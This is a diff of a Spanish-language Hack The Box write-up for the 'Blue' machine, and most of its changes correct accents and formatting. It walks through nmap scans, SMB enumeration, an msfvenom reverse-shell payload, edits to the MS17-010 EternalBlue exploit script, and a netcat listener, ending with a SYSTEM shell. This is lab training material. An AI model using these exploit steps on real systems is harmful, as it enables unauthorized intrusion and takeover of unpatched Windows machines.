@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Blue - Hack The Box
-excerpt: "Una máquina relativamente facil, ya que usamos un exploit muy conocido que hace juego con el nombre de la maquina y que hay una historia algo curiosa, siendo que este exploit supuestamente fue robado a la NCA."
+excerpt: "Una máquina relativamente fácil, ya que usamos un Exploit muy conocido que hace juego con el nombre de la máquina y que hay una historia algo curiosa, siendo que este Exploit supuestamente fue robado a la NCA."
 date: 2023-01-18
 classes: wide
 header:
@@ -21,11 +21,11 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-blue/blue_logo.png)
-Una máquina relativamente facil, ya que usamos un exploit muy conocido que hace juego con el nombre de la maquina y que hay una historia algo curiosa, siendo que este exploit "supuestamente" fue robado a la NCA.
+Una máquina relativamente fácil, ya que usamos un Exploit muy conocido que hace juego con el nombre de la máquina y que hay una historia algo curiosa, siendo que este Exploit "supuestamente" fue robado a la NCA.
 
 # Recopilación de Información
 ## Traza ICMP
-Como siempre, vamos a ver si la maquina esta conectada, lanzando un ping y a su vez, veremos que SO opera gracias al TTL.
+Como siempre, vamos a ver si la máquina está conectada, lanzando un ping y a su vez, veremos que SO opera gracias al TTL.
 ```
 ping -c 4 10.10.10.40 
 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
@@ -38,10 +38,10 @@ PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
 4 packets transmitted, 4 received, 0% packet loss, time 3005ms
 rtt min/avg/max/mdev = 128.426/129.686/130.894/0.884 ms
 ```
-Vemos que la maquina tiene el sistema Windows, empecemos ahora con los escaneos.
+Vemos que la máquina tiene el sistema Windows, empecemos ahora con los escaneos.
 
 ## Escaneo de Puertos
-Vamos a buscar que puertos estan abiertos en esta maquina:
+Vamos a buscar que puertos están abiertos en esta máquina:
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG allPorts             
 
@@ -82,7 +82,7 @@ Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Vemos varios puertos abiertos, pero ya podemos deducir que la maquina usa el servicio SMB. Ahora vamos al escaneo de servicios.
+Vemos varios puertos abiertos, pero ya podemos deducir que la máquina usa el servicio SMB. Ahora vamos al escaneo de servicios.
 
 ## Escaneo de Servicios
 Aplicando escaneo de servicios a los puertos abiertos:
@@ -130,16 +130,16 @@ Nmap done: 1 IP address (1 host up) scanned in 74.54 seconds
 * -p: Para indicar puertos especificos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Aqui vemos que se usa el servicio Samba(smb), es tiempo de buscar un exploit. Pero antes veamos un par de cositas que nos dice este escaneo.
+Aquí vemos que se usa el **servicio Samba(smb)**, es tiempo de buscar un Exploit. Pero antes veamos un par de cositas que nos dice este escaneo.
 
-Ojito con la siguiente información: servidor pero primero veamos si podemos listar los recursos compartidos:
+Ojito con la siguiente información:
 ```
 Host script results:
 | smb-security-mode: 
 |   account_used: guest
 |   authentication_level: use
 ```
-Nos indica que podemos logearnos en el servidor como invitados, asi que podriamos enumerar dicho servidor pero primero veamos si podemos listar los recursos compartidos:
+Nos indica que podemos loguearnos en el servidor como invitados, así que podríamos enumerar dicho servidor, pero primero veamos si podemos listar los recursos compartidos:
 ```
 smbclient -L 10.10.10.40                                       
 Password for [WORKGROUP\root]:
@@ -154,39 +154,37 @@ Password for [WORKGROUP\root]:
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
-
 ```
-Vemos la carpeta del Admin y usuarios, si bien podemos intentar entrar en usuarios, porque obviamente en Admin no podremos, vamos a buscar un exploit primero.
+Vemos la carpeta del Admin y usuarios, si bien podemos intentar entrar en usuarios, porque obviamente en Admin no podremos, vamos a buscar un Exploit primero.
 
-# Analisis de Vulnerabilidades
+# Análisis de Vulnerabilidades
 ## Buscando un Exploit
-Hagamos como siempre, usando la herramienta **searchsploit** para buscar un exploit adecuado de la maquina, como servicio usaremos: Windows 7 Professional 7601 Service Pack 1.
+Hagamos como siempre, usando la herramienta **Searchsploit** para buscar un Exploit adecuado de la máquina, como servicio usaremos: Windows 7 Professional 7601 Service Pack 1.
 ```
 searchsploit Windows 7 Profesional 7601 service pack 1
 Exploits: No Results
 Shellcodes: No Results
 Papers: No Results
 ```
-A canijote, no nos salio nada. Entonces vamos a buscar por internet a ver que nos aparece, solo añadamos exploit al final para que tengamos algun resultado favorable:
+A canijote, no nos salió nada. Entonces vamos a buscar por internet a ver que nos aparece, solo añadamos Exploit al final para que tengamos algún resultado favorable:
 
-Y justo nos sale un gihub con un exploit: 
+Y justo nos sale un GitHub con un Exploit: 
 * https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit
 
-Leyendolo un poco, este exploit necesita usar un entorno virtual en python 2, necesitamos tener instalada la libreria Impacket de python y crear una **Reverse Shell**, obviamente antes de continuar hay que clonar el github en nuestro equipo.
+Leyéndolo un poco, este Exploit necesita usar un entorno virtual en python 2, necesitamos tener instalada la **librería Impacket** de python y crear una **Reverse Shell**, obviamente antes de continuar hay que clonar el GitHub en nuestro equipo.
 
 ## Configurando Exploit
-* Cambiando nombre de exploit(opcional):
+* Cambiando nombre de Exploit (opcional):
 ```
 mv 42315.py Eternal_Blue.py
 ```
-
 * Instalando Entorno Virtual en Python 2:
 ```
 apt-get install python3-virtualenv && virtualenv -p python2 venv && . venv/bin/activate
 ```
-Nota: Sabras que el entorno virtual se activo porque al inicio del path veras la leyenda **(venv)**
+Nota: Sabrás que el entorno virtual se activó porque al inicio del path veras la leyenda **(venv)**
 
-* Instalando libreria Impacket en Entorno Virtual:
+* Instalando librería Impacket en Entorno Virtual:
 ```
 pip install impacket
 ```
@@ -194,19 +192,20 @@ pip install impacket
 ```
 msfvenom -p windows/shell_reverse_tcp -f exe LHOST=ObviamentePonAquiTuIP LPORT=443 > eternal-blue.exe
 ```
-* Modificando el exploit con algunos datos:
+* Modificando el Exploit con algunos datos:
 ```
 USERNAME = '' -> USERNAME = 'guest'
 smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py') -> smb_send_file(smbConn, '/Path_Donde_Esta_El_Reverse_Shell/eternal-blue.exe' 'C', '/eternal-blue.exe')
 service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') -> service_exec(conn, r'cmd /c c:\eternal-blue.exe')
 ```
+
 # Explotando Vulnerabilidades
-Una vez ya listo el exploit y siguiendo en el entorno virtual, vamos a activar una netcat que es ahi donde se conectara el exploit y luego activamos el exploit:
+Una vez ya listo el Exploit y siguiendo en el entorno virtual, vamos a activar una **netcat** que es ahí donde se conectara el Exploit y luego activamos el Exploit:
 ```
 nc -nvlp 443
 listening on [any] 443 ...
 ```
-* Activando exploit:
+* Activando Exploit:
 ```
 python Exploit_Blue.py 10.10.10.40
 Target OS: Windows 7 Professional 7601 Service Pack 1
@@ -252,12 +251,12 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
-Y listo ya estamos dentro la maquina, ya solo buscamos las flags y yasta...pero...QUE FUE LO QUE HICIMOS????
+Y listo, ya estamos dentro la máquina, ya solo buscamos las flags y yasta...pero...¿¿¿¿QUÉ FUE LO QUE HICIMOS????
 
-Bueno vamos a investigarlo y vamos a investigar que es eso de Eternal Blue.
+Bueno vamos a investigar que es eso de Eternal Blue.
 
 ## Investigación
-Bueno el Eternal Blue es una serie de vulnerabilidades del software de Microsoft como el exploit creado por la NSA como herramienta de ciberataque. Es denominado MS17-010, por lo que lo podemos buscar asi en internet o en searchsploit:
+Bueno el Eternal Blue es una serie de vulnerabilidades del software de Microsoft como el Exploit creado por la **NSA** como herramienta de ciberataque. Es denominado **MS17-010**, por lo que lo podemos buscar así en internet o en **Searchsploit**:
 
 ```
 searchsploit MS17-010                   
@@ -274,11 +273,11 @@ Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Executi
 Shellcodes: No Results
 Papers: No Results
 ```
-Incluso aqui aparece el exploit que usamos y descargamos desde el github que encontre, pero sigamos investigando.
+Incluso aquí aparece el Exploit que usamos y descargamos desde el GitHub que encontré, pero sigamos investigando.
 
 **EternalBlue aprovecha las vulnerabilidades de SMBv1 para insertar paquetes de datos maliciosos y propagar el malware por la red.**
 
-Si analizamos el exploit que se uso, vemos que se conecta a la maquina victima para poder cargar un payload, en nuestro caso la **Reverse Shell** y con eso poder conectarnos a la maquina, o bueno eso es lo que entiendo:
+Si analizamos el Exploit que se usó, vemos que se conecta a la máquina victima para poder cargar un Payload, en nuestro caso la **Reverse Shell** y con eso poder conectarnos a la máquina, o bueno eso es lo que entiendo:
 ```
 def smb_pwn(conn, arch):
         smbConn = conn.get_smbconnection()
@@ -295,21 +294,22 @@ def smb_pwn(conn, arch):
         # a simple method to get shell (but easily to be detected by AV) is
         # executing binary generated by "msfvenom -f exe-service ..."
 ```
-Aqui incluso nos ponen una nota sobre las muchas opciones que hay para convertirnos en admin y menciona el metodo simple que fue lo que hicimos. Pienso que la sección arriba del **smb_send_file** no sirve de mucho, si lo comentamos no pasaria nada, el exploit lo más seguro es que seguiria funcionando.
+Aquí incluso nos ponen una nota sobre las muchas opciones que hay para convertirnos en admin y menciona el método simple que fue lo que hicimos. Pienso que la sección arriba del **smb_send_file** no sirve de mucho, si lo comentamos no pasaría nada, el Exploit lo más seguro es que seguiría funcionando.
 
-Hay un github que incluye muchas cosas más y claro con la explicación de cada una: https://github.com/worawit/MS17-010
+Hay un GitHub que incluye muchas cosas más y claro con la explicación de cada una: 
+* https://github.com/worawit/MS17-010
 
-Este basicamente es lo mismo que descargamos pero incluye más scripts utiles, por asi decirlo es más completo y algo util que tiene es un script en python llamado checker, que nos puede ayudar a detectar los **named pipes**, estos nos sirven para ver en cuales son potenciales para inyectar comandos. Esto es mejor explicado por el **streamer S4vitar** en el siguiente link: https://www.youtube.com/watch?v=92XycxcAXkI
+Este básicamente es lo mismo que descargamos, pero incluye más scripts útiles, por así decirlo es más completo y algo útil que tiene es un script en python llamado **checker**, que nos puede ayudar a detectar los **named pipes**, estos nos sirven para ver en cuales son potenciales para inyectar comandos. Esto es mejor explicado por el **streamer S4vitar** en el siguiente link: 
+* https://www.youtube.com/watch?v=92XycxcAXkI
 
 ## Notas
-Si queremos usar las herramientas que estan en el github que usar S4vitar, es necesario instalar pip2 para usar python2, para esto hacemos lo siguiente:
-
+Si queremos usar las herramientas que están en el GitHub que usar S4vitar, es necesario instalar pip2 para usar python2, para esto hacemos lo siguiente:
 * Actualizamos todo: apt update
 * Necesitamos un archivo para poder usar el pip2, para obtenerlo usamos: curl https://bootstrap.pypa.io/pip/2.7/get-pip.py > get-pip.py
 * Ahora actualizamos con pip install --upgrade setuptools
 * E instalamos impacket -> pip2.7 install impacket
 
-Y aqui una forma distinta para usar nmap:
+Y aquí una forma distinta para usar nmap:
 ```
 locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
 "auth"
@@ -327,7 +327,7 @@ locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
 "version"
 "vuln"
 ```
-Estos son los scripts que se pueden usar en nmap para encontrar vulnerabilidades especificas, hacer fuerza bruta a la hora de escanear (que solo seria bueno en un entorno controlado), etc. Aqui un ejemplo:
+Estos son los scripts que se pueden usar en nmap para encontrar vulnerabilidades específicas, hacer fuerza bruta a la hora de escanear (que solo sería bueno en un entorno controlado), etc. Aqui un ejemplo:
 ```
 nmap --script "vuln and safe" -p445 10.10.10.40 -oN smbVulnScan
 Nmap 7.93 scan initiated Jan 19 12:42:40 2023 as: nmap --script "vuln and safe" -p445 -oN smbVulnScan 10.10.10.40
